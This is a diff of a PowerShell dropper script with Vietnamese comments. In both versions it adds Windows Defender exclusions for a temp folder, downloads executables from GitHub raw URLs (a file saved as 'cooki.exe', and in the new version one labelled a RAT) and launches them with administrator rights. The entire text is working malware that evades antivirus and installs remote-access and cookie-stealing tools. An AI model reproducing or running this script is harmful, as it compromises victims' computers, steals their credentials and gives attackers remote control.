@@ -1,21 +1,18 @@
-$systemPath = [System.IO.Path]::Combine($env:temp, "System")
+$systemPath = [System.IO.Path]::Combine($env:temp, "SystemTemp")
 New-Item -Path $systemPath -ItemType Directory -Force
 
-
+# Chặn Defender scan thư mục
 Add-MpPreference -ExclusionPath $systemPath
 
-$cookieUrl = "https://github.com/PXTDEV9022/test1/raw/refs/heads/main/ob.exe"
-$cookiePath = [System.IO.Path]::Combine($systemPath, "cooki.exe")
+# Link tải RAT
+$ratUrl = "https://github.com/minhdmkk6/testz/raw/refs/heads/main/test.exe"
+$ratPath = [System.IO.Path]::Combine($systemPath, "rat_exec.exe")
 
-Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
+# Tải file về
+Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
 
-Add-MpPreference -ExclusionProcess $cookiePath
+# Bỏ qua Defender cho file RAT
+Add-MpPreference -ExclusionProcess $ratPath
 
-$getfileUrl = "https://github.com/PXTDEV9022/s2/raw/refs/heads/main/MacroRecorderSetup.exe"
-$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile1.exe")
-
-Invoke-WebRequest -Uri $getfile1Url -OutFile $getfilePath
-
-Start -FilePath $getfilePath  -Verb RunAs
-
-Start-Process -FilePath $cookiPath  -Verb RunAs
+# Chạy với quyền Admin
+Start-Process -FilePath $ratPath -Verb RunAs
